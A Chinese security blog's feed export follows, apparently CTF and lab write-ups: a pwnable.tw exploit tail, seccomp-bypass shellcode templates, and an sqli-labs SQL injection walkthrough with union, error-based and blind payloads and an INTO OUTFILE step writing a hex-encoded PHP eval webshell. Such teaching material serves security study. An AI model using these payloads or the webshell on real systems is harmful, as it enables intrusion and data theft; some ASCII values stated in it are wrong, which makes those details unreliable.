class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)+<span class="number">0x1000</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">fake_FILE = <span class="number">0x804b280</span>+<span class="number">0x4</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p32(fake_FILE)</span><br><span class="line">payload+= p32(<span class="number">0xffffdfff</span>)+<span class="string">b&#x27;;sh&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x8d</span>+p32(fake_FILE+<span class="number">0x98</span>)</span><br><span class="line">payload+= p32(<span class="number">0</span>)*<span class="number">2</span>+p32(system)</span><br><span class="line">exit_with_name(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwn刷题记录</category>
        <category>pwnable.tw刷题</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title>shellcode之浅谈突破沙箱规则</title>
    <url>/2024/08/07/shellcode%E4%B9%8B%E6%B5%85%E8%B0%88%E7%AA%81%E7%A0%B4%E6%B2%99%E7%AE%B1%E8%A7%84%E5%88%99/</url>
    <content><![CDATA[<p>由于沙箱规则比较多，规则制定比较自由，所以下文重点探讨绕过的技术。</p>
<span id="more"></span>

<h2 id="使用-at-v-2-系统调用"><a href="#使用-at-v-2-系统调用" class="headerlink" title="使用_at&#x2F;v&#x2F;2_系统调用"></a>使用_at&#x2F;v&#x2F;2_系统调用</h2><p>这里分别指的是几个系统调用的后缀和前缀，比如：</p>
<ul>
<li>使用<code>execveat</code>代替<code>execve</code>，拿到<code>shell</code>后，使用<code>shell</code>内置命令读取<code>flag</code>: <code>echo *; read FLAG &lt; /flag;echo $FLAG</code>，否则使用子<code>shell</code>执行命令还是会被沙箱杀死。同样的，使用<code>openat</code>代替<code>open</code>。</li>
<li>使用<code>readv/writev</code>代替<code>read/write</code></li>
<li>使用<code>mmap2</code>代替<code>mmap</code></li>
<li>还有一些特殊的系统调用，使用<code>sendfile</code>，代替<code>read/write</code>。这类的系统调用需要平时多关注、收集和整理。</li>
</ul>
<p>随便找一个<code>seccomp-tools</code>解析的沙箱规则：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x08 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0010</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x06 0x00 0x40000000  <span class="keyword">if</span> (A &gt;= 0x40000000) goto 0010</span><br><span class="line"> 0004: 0x15 0x05 0x00 0x0000003b  <span class="keyword">if</span> (A == execve) goto 0010</span><br><span class="line"> 0005: 0x15 0x04 0x00 0x00000142  <span class="keyword">if</span> (A == execveat) goto 0010</span><br><span class="line"> 0006: 0x15 0x03 0x00 0x00000039  <span class="keyword">if</span> (A == fork) goto 0010</span><br><span class="line"> 0007: 0x15 0x02 0x00 0x00000038  <span class="keyword">if</span> (A == <span class="built_in">clone</span>) goto 0010</span><br><span class="line"> 0008: 0x15 0x01 0x00 0x0000000f  <span class="keyword">if</span> (A == rt_sigreturn) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure>

<p>这个沙箱规则判断了当前触发系统调用的时候，<code>arch</code>是否为<code>x64</code>，如果不是<code>64</code>就会<code>kill</code>；然后，判断了<code>sys-number</code>是否大于等于<code>0x40000000</code>，如果大于，程序也会被<code>kill</code>；然后设置了黑名单，分别是：<code>execve/execveat/fork/clone/rt_sigreturn</code>。处于黑名单的系统调用会被<code>kill</code>掉，其他系统调用则会放行。</p>
<h2 id="切换指令模式"><a href="#切换指令模式" class="headerlink" title="切换指令模式"></a>切换指令模式</h2><p>如果没有<code>0001: 0x15 0x00 0x08 0xc000003e if (A != ARCH_X86_64) goto 0010</code>这一句的检查，那么可以使用<code>retf(return far)</code>指令实现架构切换，或者在<code>x64</code>环境下直接调用<code>int 0x80</code>陷入到内核态。</p>
<p><code>retf</code>相当于<code>pop ip; pop cs</code>，<code>cs</code>是段寄存器，寄存器为<code>0x23</code>时表示<code>32</code>位运行模式，<code>0x33</code>表示<code>64</code>位运行模式。</p>
<p>从<code>64</code>位切换到<code>32</code>位的模板如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor esp, esp</span><br><span class="line">mov rsp, 0x400100</span><br><span class="line">mov eax, 0x23 ; cs</span><br><span class="line">mov [rsp+4], eax</span><br><span class="line">mov eax, 0x400800 ; ip</span><br><span class="line">mov [rsp], eax</span><br><span class="line">retf</span><br></pre></td></tr></table></figure>

<h2 id="使用-0x40000000-X-系统调用"><a href="#使用-0x40000000-X-系统调用" class="headerlink" title="使用**0x40000000+X**系统调用"></a>使用**<code>0x40000000+X</code>**系统调用</h2><p>如果没有限制：<code>0003: 0x35 0x06 0x00 0x40000000 if (A &gt;= 0x40000000) goto 0010</code>的话，那么可以使用<code>0x40000000 + X</code>来执行系统调用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __X32_SYSCALL_BIT	0x40000000UL</span></span><br></pre></td></tr></table></figure>

<p>关于<code>x32 ABI</code>可查看<a href="https://en.wikipedia.org/wiki/X32_ABI">x32 ABI - Wikipedia</a>。</p>
<p>比如要执行<code>read</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor eax, eax</span><br><span class="line">add eax, 0x40000000</span><br><span class="line">xor edi, edi</span><br><span class="line">mov rsi, rsp</span><br><span class="line">mov edx, 0x300</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<p>需要注意的是，从<code>5.16</code>开始，<code>linux</code>内核不支持<code>x32 abi</code>了：<a href="https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1994516">Bug #1994516 “Kernels after 5.16 cannot execute x32-ABI binaries…” : Bugs : linux package : Ubuntu (launchpad.net)</a></p>
]]></content>
      <categories>
        <category>pwn学习总结</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>栈</tag>
        <tag>沙箱</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-lab靶场通关记录</title>
    <url>/2024/10/29/sqli-lab%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="基于报错注入"><a href="#基于报错注入" class="headerlink" title="基于报错注入"></a>基于报错注入</h2><h3 id="单引号字符型注入"><a href="#单引号字符型注入" class="headerlink" title="单引号字符型注入"></a>单引号字符型注入</h3><h4 id="字符型注入还是数字型注入"><a href="#字符型注入还是数字型注入" class="headerlink" title="字符型注入还是数字型注入"></a>字符型注入还是数字型注入</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; //等号前后不能有空格，即不能是?id = 1&#x27;</span>这样</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132304860.png" alt="image-20240911225450764"></p>
<h4 id="是否为单引号闭合型注入"><a href="#是否为单引号闭合型注入" class="headerlink" title="是否为单引号闭合型注入"></a>是否为单引号闭合型注入</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>

<p>用<code>--+</code>把后面的内容注释掉，然后回显正常，说明是单引号闭合型注入</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131919410.png" alt="image-20240911225916591"></p>
<h4 id="该语句查询了几列数据"><a href="#该语句查询了几列数据" class="headerlink" title="该语句查询了几列数据"></a>该语句查询了几列数据</h4><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27; order <span class="keyword">by</span> <span class="number">1</span><span class="comment">--+</span></span><br><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27; order <span class="keyword">by</span> <span class="number">2</span><span class="comment">--+</span></span><br><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27; order <span class="keyword">by</span> <span class="number">3</span><span class="comment">--+</span></span><br><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27; order <span class="keyword">by</span> <span class="number">4</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>一直到<code>3</code>时依然回显正常，到<code>4</code>就开始报错，说明查询了<code>3</code>列数据。那么，我们现在构造的，<code>union</code>后面的语句中也要查询<code>3</code>列。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131919141.png" alt="image-20240911230911434"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131920889.png" alt="image-20240911225916591"></p>
<h4 id="会显示哪几列"><a href="#会显示哪几列" class="headerlink" title="会显示哪几列"></a>会显示哪几列</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3--+</span></span><br><span class="line"><span class="string">-1 是因为前面要错误，union后面的才能执行</span></span><br></pre></td></tr></table></figure>

<p>通过回显<code>2,3</code>可知，是第二，三列</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131920900.png" alt="image-20240911231819368"></p>
<h4 id="查询数据库名"><a href="#查询数据库名" class="headerlink" title="查询数据库名"></a>查询数据库名</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,database()--+</span></span><br></pre></td></tr></table></figure>

<p>显示当前的数据库名是<code>security</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131921921.png" alt="image-20240911232330147"></p>
<h4 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=&#x27;</span>security<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>

<p>首先要知道，**<code>group_concat()</code>函数会将查询的表名连在一起输出<strong>，然后，</strong>有一个<code>information_schema</code>库，该库中有一个<code>tables</code>表，该表存有所有数据库的表名。**<code>table_schema=&#39;security&#39;</code>表示查询<code>table_schema</code>字段为<code>security</code>的列，再加上前面的<code>table_name</code>(<code>tables</code>表中的一个列名，下面全是各种库中的表名)，表示查询<code>security</code>库的所有表名。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131921019.png" alt="image-20240911233736048"></p>
<h4 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">group_concat(table_name),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> frfromom infoorrmation_schema.tables <span class="keyword">WHERE</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span><span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">group_concat(column_name),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> frfromom infoorrmation_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span><span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">group_concat(flag),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> frfromom flag<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">ZLCTF&#123;<span class="number">21232</span>f297a57a5a743894a0e4a801fc3<span class="number">-084e0343</span>a0486ff05530df6c705c8bb4<span class="operator">-</span>a4346e75cc1dd161a8d57f3b2d5d82d0&#125;</span><br><span class="line"></span><br><span class="line">ZLCTF&#123;<span class="number">5</span>acb72b8<span class="number">-137</span>f<span class="number">-4</span>daa<span class="operator">-</span>a647<span class="number">-340</span>b72101d4b&#125;</span><br><span class="line">Your Password:admin,guest,virink</span><br><span class="line"></span><br><span class="line">schema_name,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> frfromom infoorrmation_schema.schemata<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">information_schema,performance_schema,mysql,test,ctftraining,ctf</span><br><span class="line">ctf:flag,users</span><br></pre></td></tr></table></figure>

<p>与<code>tables</code>表相似，<code>information_schema</code>库中有一个<code>columns</code>表，存有所有数据库的列名。上面语句表示，查询<code>security</code>库中的<code>users</code>表中的所有列名。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131921061.png" alt="image-20240911234752459"></p>
<h4 id="查询列表中的内容"><a href="#查询列表中的内容" class="headerlink" title="查询列表中的内容"></a>查询列表中的内容</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; UNION SELECT 1,group_concat(username),group_concat(password) FROM security.users--+</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131921503.png" alt="image-20240911235254031"></p>
<h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p>传入<code>?id=1</code>，正常回显</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131921192.png" alt="image-20241029144140515" style="zoom:50%;" />

<p>传入<code>?id=1&#39;</code>，回显的报错中没有显示我们传入的数字</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131921075.png" alt="image-20241029144207150" style="zoom: 50%;" />

<p>传入<code>?id=1--+</code>，正常回显</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131922959.png" alt="image-20241029144240783" style="zoom:50%;" />

<p>因此得知本关是基于报错的数字型注入</p>
<h3 id="单引号变形字符型注入"><a href="#单引号变形字符型注入" class="headerlink" title="单引号变形字符型注入"></a>单引号变形字符型注入</h3><p>第一关的闭合符号是<code>&#39;</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131922074.png" alt="image-20241029143718824"></p>
<p>本关的闭合符号变成了<code>&#39;)</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131922354.png" alt="image-20241029143849314"></p>
<h3 id="双引号变形字符型注入"><a href="#双引号变形字符型注入" class="headerlink" title="双引号变形字符型注入"></a>双引号变形字符型注入</h3><p>传入<code>?id=1&#39;</code>，依旧回显正常，这时候可以猜测一下是不是双引号闭合</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131922686.png" alt="image-20241029145629173" style="zoom:50%;" />

<p>传入<code>?id=1&quot;</code>，根据报错回显确定了，闭合符号是<code>&quot;)</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131922751.png" alt="image-20241029145816812"></p>
<h3 id="通过函数报错注入"><a href="#通过函数报错注入" class="headerlink" title="通过函数报错注入"></a>通过函数报错注入</h3><h4 id="通过floor报错"><a href="#通过floor报错" class="headerlink" title="通过floor报错"></a>通过<code>floor</code>报错</h4><p><strong>该方法最多回显<code>64</code>个字符。</strong></p>
<p>爆数据库、版本、用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ?id=1&#x27;和?id=-1&#x27;都行</span><br><span class="line">UNION SELECT count(*),0,concat(</span><br><span class="line">    0x3a,     #利用 : 隔开数据库名称</span><br><span class="line">    (SELECT database()),</span><br><span class="line">    0x3a,</span><br><span class="line">    floor(rand(0)*2)</span><br><span class="line">) as x FROM information_schema.tables group by x--+</span><br><span class="line">#后半段格式:as xxx from 表名 group by xxx--+</span><br></pre></td></tr></table></figure>

<p>爆表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UNION SELECT count(*),0,concat(</span><br><span class="line">    0x3a,</span><br><span class="line">    (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=&#x27;security&#x27;),</span><br><span class="line">    0x3a,</span><br><span class="line">    floor(rand(0)*2)</span><br><span class="line">) as x FROM information_schema.tables group by x--+</span><br></pre></td></tr></table></figure>

<p>爆列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UNION SELECT count(*),0,concat(</span><br><span class="line">    0x3a,</span><br><span class="line">    (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),</span><br><span class="line">    0x3a,</span><br><span class="line">    floor(rand(0)*2)</span><br><span class="line">) as x FROM information_schema.tables group by x--+</span><br></pre></td></tr></table></figure>

<p>爆内容，这里不知道为什么用<code>group_concat()</code>不行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UNION SELECT count(*),0,concat(</span><br><span class="line">    0x3a,</span><br><span class="line">    (SELECT username FROM users limit 1),   #password和username都只能爆出username</span><br><span class="line">    0x3a,</span><br><span class="line">    floor(rand(0)*2)</span><br><span class="line">) as x FROM information_schema.tables group by x--+</span><br></pre></td></tr></table></figure>

<h4 id="updatexml报错"><a href="#updatexml报错" class="headerlink" title="updatexml报错"></a><code>updatexml</code>报错</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p><strong>最多回显<code>32</code>个字符。</strong></p>
<p>​	<code>updatexml()</code>使用时，当<code>xpath_string</code>格式出现错误，<code>masql</code>会报出语法错误，而执行结果也在错误里。对于<code>select * FROM test WHERE id=1 AND updatexml(1,0x7e,1);</code>，其中<code>0x7e</code>是<code>~</code>，其不属于<code>xpath</code>语法格式，因此报出<code>xpath</code>语法错误。<br>只有在<code>payload</code>返回的不是<code>xml</code>格式才会生效。</p>
<h5 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h5><p>爆数据库、版本号、用户名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#传入 ?id=1&#x27;+payload</span><br><span class="line">#payload如下</span><br><span class="line">AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--+</span><br></pre></td></tr></table></figure>

<p><strong><code>concat()</code>是连接函数。</strong></p>
<p>爆表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND updatexml(1,concat(</span><br><span class="line">    0x7e,</span><br><span class="line">    (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=&#x27;security&#x27;),</span><br><span class="line">    0x7e</span><br><span class="line">),1)--+</span><br></pre></td></tr></table></figure>

<p>爆列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND updatexml(1,concat(</span><br><span class="line">    0x7e,</span><br><span class="line">    (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=&#x27;security&#x27; AND table_name=&#x27;users&#x27;),</span><br><span class="line">    0x7e</span><br><span class="line">),1)--+</span><br></pre></td></tr></table></figure>

<p>爆内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND updatexml(1,concat(</span><br><span class="line">    0x7e,</span><br><span class="line">    substr((SELECT group_concat(username) FROM users),1,32),</span><br><span class="line">    0x7e</span><br><span class="line">),1)--+</span><br></pre></td></tr></table></figure>

<p><strong>利用<code>substr()</code>函数绕过字数限制，爆出所有内容。</strong></p>
<h4 id="ExtractValue报错"><a href="#ExtractValue报错" class="headerlink" title="ExtractValue报错"></a><code>ExtractValue</code>报错</h4><p><strong>最多回显<code>32</code>个字符。</strong></p>
<p>爆数据库、版本号、用户名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND ExtractValue(1,concat(0x7e,(SELECT database()),0x7e))--+</span><br></pre></td></tr></table></figure>

<p>爆表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND ExtractValue(1,concat(</span><br><span class="line">    0x7e,</span><br><span class="line">    (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=&#x27;security&#x27;),</span><br><span class="line">    0x7e))--+</span><br></pre></td></tr></table></figure>

<p>爆列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND ExtractValue(1,concat(</span><br><span class="line">    0x7e,</span><br><span class="line">    (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=&#x27;security&#x27; AND table_name=&#x27;users&#x27; ),</span><br><span class="line">    0x7e))--+</span><br></pre></td></tr></table></figure>

<p>爆内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND ExtractValue(1,concat(</span><br><span class="line">    0x7e,</span><br><span class="line">    substr((SELECT group_concat(password) FROM users),1,31),</span><br><span class="line">    0x7e))--+</span><br></pre></td></tr></table></figure>

<h2 id="Lass-7文件写入"><a href="#Lass-7文件写入" class="headerlink" title="Lass-7文件写入"></a><code>Lass-7</code>文件写入</h2><p>参考文章：<a href="https://www.cnblogs.com/7-58/p/14101610.html">Mysql注入中的outfile、dumpfile函数详解 - gxy* - 博客园</a></p>
<h4 id="into-outfile命令"><a href="#into-outfile命令" class="headerlink" title="into outfile命令"></a><code>into outfile</code>命令</h4><p>运用该命令的格式如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT...into outfile &#x27;绝对路径&#x27;</span><br><span class="line">SELECT 1,2,3 into outfile &#x27;绝对路径&#x27;</span><br><span class="line">SELECT null,0x3c3f70687020406576616c28245f504f53545b227368656c6c225d293b203f3e,null</span><br><span class="line">	into outfile &#x27;绝对路径&#x27;</span><br><span class="line">#0x3c3f70687020406576616c28245f504f53545b227368656c6c225d293b203f3e是&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;对应每个字符的十六进制连成的</span><br><span class="line"></span><br><span class="line">0x3c3f70687020406576616c285f504f53545b227368656c6c225d293b203f3e</span><br></pre></td></tr></table></figure>

<p>​	<code>0x3c3f70687020406576616c28245f504f53545b227368656c6c225d293b203f3e</code>是<?php @eval($_POST["shell"]); ?>对应每个字符的十六进制连成的。</p>
<h5 id="secure-file-priv参数"><a href="#secure-file-priv参数" class="headerlink" title="secure_file_priv参数"></a><code>secure_file_priv</code>参数</h5><p>​	因为涉及到在服务器上写入文件，所以<code>into outfile</code>函数能否成功执行受到参数<code>secure_file_priv</code>的影响，可以利用<code>select @@secure_file_priv</code>命令查询其值。</p>
<ul>
<li>当<code>secure_file_priv=&#39;&#39;</code>时，对导入导出无限制</li>
<li>当为指定的目录时，只能向指定的目录导入导出</li>
<li>当<code>secure_file_priv=NULL</code>时，禁止导入导出功能</li>
</ul>
<h5 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h5><ul>
<li>知道绝对路径</li>
<li>在数据库配置文件中含有配置项<code>secure_file_priv=&#39;&#39;</code></li>
<li>具有<code>root</code>权限</li>
</ul>
<p>还有<code>into dumpfile()</code>和<code>load_file()</code>这两个函数以后可能也会用到。</p>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p><a href="https://blog.csdn.net/Waffle666/article/details/111465709">SQL注入之布尔盲注——sql-lab第八关</a></p>
<p><a href="https://blog.csdn.net/weixin_45146120/article/details/100104131?utm_source=app">布尔盲注详解</a></p>
<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p>设置字符串<code>str=&#39;hmhwazyt5799&#39;</code></p>
<ul>
<li><code>length(str)</code>返回字符串的长度，<code>12</code></li>
<li><code>left(str,1)</code>返回字符串<code>str</code>的第<code>1</code>个字符，<code>h</code></li>
<li><code>ascii(left(str,1))</code>返回<code>h</code>的<code>ascii</code>码，<code>49</code></li>
<li><code>substr((str),9,4)</code>返回<code>str</code>中从第<code>9</code>个字符开始长度为<code>4</code>的字符串，<code>5799</code></li>
</ul>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131922873.png" alt="image-20241031214502415" style="zoom:50%;" />

<h3 id="注入流程-1"><a href="#注入流程-1" class="headerlink" title="注入流程"></a>注入流程</h3><p>注：前面求闭合符号略过，传入<code>?id=1&#39;+payload</code>即可。</p>
<ul>
<li><strong>爆库名长度</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM tab WHERE id=1 AND (length(database())=8)</span><br></pre></td></tr></table></figure>

<p>设置变量</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131923243.png" alt="image-20241031182917813" style="zoom:50%;" />

<p>设置<code>payload</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131923213.png" alt="image-20241031183010480" style="zoom:50%;" />

<p>爆破</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131923801.png" alt="image-20241031182811644" style="zoom:50%;" />

<p>成功确定数据库名长度为<code>8</code></p>
<ul>
<li><strong>爆数据库</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM tab WHERE id=1 AND (left(database(),1)=&#x27;s&#x27;)</span><br><span class="line">SELECT * FROM tab WHERE id=1 AND (ascii(left(database(),1))=57)</span><br><span class="line">SELECT * FROM tab WHERE id=1 AND (ascii(substr(database(),1,1))=57)</span><br></pre></td></tr></table></figure>

<p>设置变量和攻击方式，这里采取<code>Clustter bomb</code>攻击</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131923890.png" alt="QQ_1730382622041" style="zoom:50%;" />

<p>设置<code>payload</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131923248.png" alt="image-20241031215143950" style="zoom:50%;" />

<img src="https://gitee.com/Qwen11/pic/raw/master/202410312152072.png" alt="image-20241031215206013" style="zoom:50%;" />

<p>爆破</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131923274.png" alt="image-20241031215748696"><br><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131924988.png" alt="image-20241031215539921"><br><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131924216.png" alt="image-20241031215559791"><br><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131925373.png" alt="image-20241031215853258"><br><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131925770.png" alt="image-20241031220417430"><br><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131925213.png" alt="image-20241031220443739"><br><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131925481.png" alt="image-20241031220522121"><br>!<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926572.png" alt="image-20241031220655801"></p>
<p>成功确定数据库<code>security</code></p>
<ul>
<li><strong>爆表个数</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND (SELECT count(table_name)</span><br><span class="line">     FROM information_schema.tables </span><br><span class="line">     WHERE table_schema=database())=4</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>爆各个表长度</strong></li>
</ul>
<p><strong>注意：</strong><code>length</code>括在<code>select</code>外，二者间要加两个括号。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926656.png" alt="image-20241101144846331" style="zoom:50%;" />

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#爆第一个表的长度</span><br><span class="line">AND length((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=6</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926738.png" alt="image-20241101144922983" style="zoom:50%;" />

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#爆第二个表的长度</span><br><span class="line">AND length((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1))=8</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926472.png" alt="image-20241101144948805" style="zoom:50%;" />

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#爆第三个表的长度</span><br><span class="line">AND length((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 2,1))=7</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926955.png" alt="image-20241101145035538" style="zoom:50%;" />

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#爆第四个表的长度</span><br><span class="line">AND length((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 3,1))=5</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>爆各个表名</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#第四个表的第一个字符u的ascii码</span><br><span class="line">AND ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 3,1),1,1))=117</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>爆指定表中列个数</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND (SELECT count(column_name) FROM information_schema.columns WHERE table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;)=3</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>爆各个列长度</strong></li>
</ul>
